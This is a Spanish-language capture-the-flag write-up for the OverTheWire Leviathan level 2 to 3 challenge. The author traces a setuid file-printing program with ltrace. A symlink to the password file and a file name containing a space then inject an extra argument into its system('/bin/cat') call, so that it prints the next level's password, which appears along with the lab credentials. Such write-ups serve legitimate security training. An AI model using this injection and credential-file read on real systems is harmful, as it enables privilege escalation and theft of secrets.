## Leviathan Level 2 → Level 3

## Level Goal

There is no information for this level, intentionally.

## Write Up Iker 

Fácil. Tenemos que conectarnos por **SSH** a la dirección **leviathan.labs.overthewire.org** en el puerto **2223** con los siguientes datos:

```bash
  - User: leviathan1
  - Pass: ougahZi8Ta
```

Escribimos el siguiente comando en la consola:
  
```bash 
$ ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

Accedemos sin problemas y vemos que hay un fichero llamado **printfile**

```bash
leviathan2@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
```

Ejecutamos el programa y nos indica que debemos especificarle el nombre de un fichero para imprimirlo.

```bash
leviathan2@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile asdf.txt
You cant have that file...
```

Vamos a probar a ver si nos deja imprimir por la password del directorio que hemos localizado antes.

```bash
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

¡Vaya! Nos nos deja :( . Tendremos que obligarle a que imprima un fichero de verdad.

El mejor lugar para crear un fichero temporal es en la carpeta **tmp** del sistema por lo que vamos a crear uno allí.

```bash
leviathan2@leviathan:~$ mkdir /tmp/iker & touch /tmp/iker/asdf.txt
[1] 318
[1]+  Done                    mkdir /tmp/iker
leviathan2@leviathan:~$ ls -l /tmp/iker/      
total 0
-rw-rw-r-- 1 leviathan2 leviathan2 0 Sep  6 15:24 asdf.txt
```

Ahora que ya hemos creado nuestro fichero vamos a intentar imprimirlo.

```bash
leviathan2@leviathan:~$ ./printfile /tmp/iker/asdf.txt
leviathan2@leviathan:~$ 
```

Lo ejecutamos pero no nos da ningun error. Vamos a volver a ejecutarlo pero esta vez con el comando **ltrace** para ver que es lo que hace.

```bash
leviathan2@leviathan:~$ltrace ./printfile /tmp/iker/asdf.txt
leviathan2@leviathan:~$ 
```

```bash
leviathan2@leviathan:~$ ltrace ./printfile /tmp/iker/asdf.txt
__libc_start_main(0x804852d, 2, 0xffffd7d4, 0x8048600 <unfinished ...>
access("/tmp/iker/asdf.txt", 4)                                                                                               = 0
snprintf("/bin/cat /tmp/iker/asdf.txt", 511, "/bin/cat %s", "/tmp/iker/asdf.txt")                                             = 27
system("/bin/cat /tmp/iker/asdf.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                        = 0
+++ exited (status 0) +++
```

Tal y como pensaba, el programa realiza un **cat** sobre un parámetro que le pasemos desde el fichero **adsf.txt**

Vamos a agregar el directorio que hemos comentado antes **/etc/leviathan_pass/leviathan3** al fichero **asdf.txt** de tal forma que el programa realice la lectura del fichero.

```bash
snprintf("/bin/cat /tmp/iker/asdf.txt", 511, "/bin/cat %s", "/tmp/iker/asdf.txt")   
```
**%s** será el contenido del fichero **/tmp/iker/asdf.txt**  que le pondremos la ruta **/etc/leviathan_pass/leviathan3** .

```bash
leviathan2@leviathan:~$ ./printfile /tmp/iker/asdf.txt
/etc/leviathan_pass/leviathan3
```
Probamos el comando anterior pero solo muestra el contenido del fichero de asdf.txt, es decir, la ruta que hemos agregado manualmente. Algo se nos escapa. 

Vamos a analizar el código de nuevo.

Vemos algo curioso a la hora de listar el directorio donde está el programa.

```bash
leviathan2@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
```

Observamos que el fichero **printfile** tambien tiene como usuario global a **leviathan3** y usuario real a **leviathan3**.

```html
Con procesos de Linux ejecutandose bajo un "user-ID". Esto les da acceso a todos los recursos (ficheros, etc...) a los que este usuario tendría acceso. Hay dos user-ID's. El user-ID real y el user-ID efectivo. El user-ID efectivo es el que determina el acceso a los ficheros. 
```

Es decir, que **leviathan3** es el **User-ID efectivo**, el que determina el acceso a los ficheros y **leviathan2** es el **User-ID Real**.

Después de investigar un poco el código resultante de **ltrace** e internet, vemos que la llamada **access** se hace con el **User-Id Efectivo** en este caso y que podemos hacer un **bypass** 

Después de pelear con los enlaces symbólicos consigo haver con la pass. 

```bash
leviathan2@leviathan:/tmp/iker$ ls -l
total 4
lrwxrwxrwx 1 leviathan2 leviathan2 30 Sep  6 15:58 asdf -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2 33 Sep  6 15:37 asdf.txt
leviathan2@leviathan:/tmp/iker$ touch asdf\ asdf.txt
leviathan2@leviathan:/tmp/iker$ ls -l
total 4
lrwxrwxrwx 1 leviathan2 leviathan2 30 Sep  6 15:58 asdf -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2  0 Sep  6 16:03 asdf asdf.txt
leviathan2@leviathan:/tmp/iker$ ~/printfile "asdf asdf.txt"
Ahdiemoo1j
```

:v: :sunglasses: :v:

**FLAG** = {Ahdiemoo1j} 
